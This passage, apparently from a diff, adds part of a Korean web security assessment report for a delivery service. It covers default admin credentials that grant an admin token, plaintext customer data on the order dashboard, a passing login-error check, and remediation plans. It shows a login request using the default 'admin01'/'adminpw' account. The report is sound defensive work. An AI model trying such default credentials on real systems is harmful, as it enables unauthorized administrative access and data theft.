+{"userid":"admin01","userpw":"adminpw"}
+
+HTTP/1.1 200
+{"responseType":"SUCCESS","data":{"token":"<JWT>","role":"ADMIN",...}}
+```
+
+**영향**  
+- 외부인이 관리자 권한을 확보하여 데이터 삭제, 포인트 조작 등 모든 치명적 취약점을 연쇄적으로 악용할 수 있음.
+- 기본 비밀번호가 그대로 배포될 경우 규제 준수(Personal Information Protection Act) 위반 가능.
+
+**개선 권고**  
+- 운영 배포 전 모든 기본 계정 강제 초기화 및 복잡도 정책(대문자/특수문자 포함)을 적용.
+- 관리자 로그인 시 2단계 인증(OTP) 도입.
+- 5회 이상 로그인 실패 시 계정 잠금 및 관리자 알림.
+
+---
+
+### V-05. 대시보드 화면 내 개인정보 평문 노출 (주의)
+**취약점 분류**: 개인정보보호법 제29조 기술적 보호조치 — 단말기 화면 내 중요정보 노출  
+**취약점 발생 위치**: `http://localhost:3000/dashboard` (API `GET /api/order/{id}`)  
+**노출 항목**: 고객명, 전화번호, 주소, 결제 방법  
+**상태**: 주의 (보완 필요)
+
+**요약**  
+주문 상세 화면에 고객 이름·전화번호·주소가 그대로 노출된다. 가맹점 운영에는 필요하지만, 화면 캡처나 어깨너머 공격에 취약하며, 점주 계정 탈취 시 대량 개인정보 유출이 즉시 발생한다.
+
+**재현 절차**  
+Step 1) `owner01` 계정으로 로그인 후 `주문 관리` 페이지에서 주문을 선택한다.  
+![V05-Step1](./evidence/v05_step1_dashboard.png "주문 목록에서 특정 주문을 선택하는 장면")
+
+Step 2) 주문 상세 패널에서 고객 이름, 전화번호, 주소, 결제 방법이 모두 평문으로 표시되는 것을 확인한다.  
+![V05-Step2](./evidence/v05_step2_detail.png "주문 상세 정보에 개인정보가 평문으로 노출된 화면")
+
+**영향 및 권고**  
+- 오프라인 단말기에서 화면 노출 시 개인정보 오남용 가능.
+- 최소화 원칙에 따라 필요 정보만 표시하고, 전화번호·주소는 부분 마스킹 또는 클릭 시 팝업으로 노출하도록 개선.
+- 화면 캡처 방지 정책(워터마크, 관리자 경고 문구) 및 접근 로그 강화.
+
+---
+
+## 5. 양호 항목 상세 증적
+
+### G-01. 로그인 실패 시 상세 시스템 정보 미노출
+Step 1) `http://localhost:3000/login` 화면에서 존재하지 않는 계정(`testuser`)과 잘못된 비밀번호를 입력한다.  
+![G01-Step1](./evidence/g01_step1_input.png "존재하지 않는 계정 정보를 입력하는 화면")
+
+Step 2) Burp Suite로 응답을 확인하면 HTTP 200과 함께 사용자 메시지 “로그인 실패”만 노출되며, 내부 예외나 스택 트레이스가 반환되지 않는다.  
+![G01-Step2](./evidence/g01_step2_response.png "Burp Suite에서 확인한 로그인 실패 응답")
+
+**판정 근거**  
+- OWASP ASVS V2 “이상 징후 노출 금지” 요구사항을 충족한다.
+- 다만 반복 실패 시 계정 잠금 정책이 없으므로 V-04 조치와 함께 보완 필요.
+
+---
+
+## 6. 판정 용어 및 권장 대응 요약
+- **취약**: 즉시 조치 필요. 개발팀은 2주 이내 수정 배포 계획 수립 후 보안팀에 공유.
+- **주의**: 운영 절차 또는 정책 보완 필요. 개선 로드맵에 포함.
+- **양호**: 현재 구현이 보안 요구사항을 충족. 주기적 모니터링 지속.
+- **N/A**: 서비스 기능 부재로 점검 제외. 기능 추가 시 재점검.
+- **내용 없음**: 기능 존재하나 데이터 미수집. 운영 전 실제 데이터로 재검증 필요.
+
+---
+
+## 7. 참고 자료
+- KISA 「웹 취약점 분석·평가 기준」 2024
+- OWASP Top 10 (2021) – A01 Broken Access Control, A04 Insecure Design, A07 Identification and Authentication Failures
+- OWASP Cheat Sheet Series – REST Security, Authentication
+- 개인정보보호법 제29조 및 행정안전부 「개인정보의 안전성 확보조치 기준」
+
+---
+
+## 8. 차후 일정 제안
+1. 개발팀: V-01, V-02, V-03 취약점 수정 코드를 2025-11-18까지 제출.
+2. 보안팀: 수정 배포 후 재검증 및 증적 업데이트.
+3. 교육: 관리자 계정 관리 정책 및 Burp Suite 활용 재교육(2025-11-25 예정).
+
+---
+
+**문의**  
+보안팀 이메일: security@barobaedal.com  
+담당자: 보안 담당자 A / 내선 1234
